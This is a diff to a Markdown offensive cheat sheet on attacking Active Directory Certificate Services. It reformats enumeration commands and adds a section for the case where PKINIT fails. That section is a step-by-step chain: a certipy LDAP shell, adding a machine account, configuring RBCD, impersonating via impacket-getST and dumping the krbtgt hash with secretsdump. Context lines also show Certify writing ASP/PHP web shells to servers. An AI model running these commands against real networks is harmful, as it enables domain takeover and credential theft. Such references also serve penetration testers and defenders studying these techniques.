@@ -4,9 +4,21 @@ Active Directory Certificate Services (AD CS) is a Microsoft Windows server role
 
 ## ADCS Enumeration
 
-* netexec: `netexec ldap domain.lab -u username -p password -M adcs`
-* ldapsearch: `ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName`
-* certutil: `certutil.exe -config - -ping`, `certutil -dump`
+* netexec: 
+    ```ps1
+    netexec ldap domain.lab -u username -p password -M adcs
+    ```
+
+* ldapsearch: 
+    ```ps1
+    ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
+    ```
+
+* certutil: 
+    ```ps1
+    certutil.exe -config - -ping
+    certutil -dump
+    ```
 
 ## Certificate Enrollment
 
@@ -232,11 +244,11 @@ Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
 Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
 ```
 
-## ESC8 - AD CS Relay Attack
+## ESC8 - Web Enrollment Relay
 
 > An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.
 
-Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
+Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101
 
 * **Version 1**: NTLM Relay + Rubeus + PetitPotam
 
@@ -584,6 +596,46 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
   certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
+
+
+### PKINIT ERROR
+
+When the DC does not support **PKINIT** (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.
+
+```ps1
+$ certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
+[...]
+KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)
+```
+
+There is still a way to use the certificate to takeover the account.
+
+* Open an LDAP shell using the certificate
+    ```ps1
+    certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
+    ```
+
+* Add a computer for RBCD
+    ```ps1
+    impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name "NEWCOMPUTER" -computer-pass "P@ssw0rd123*"
+    ```
+
+* Set the RBCD
+    ```ps1
+    set_rbcd 'TARGET$' 'NEWCOMPUTER$'
+    ```
+
+* Request a ticket with impersonation
+    ```ps1
+    impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'
+    ```
+
+* Use the ticket
+    ```ps1
+    export KRB5CCNAME=DC$.ccache
+    impacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'
+    ```
+
 
 ## UnPAC The Hash
 
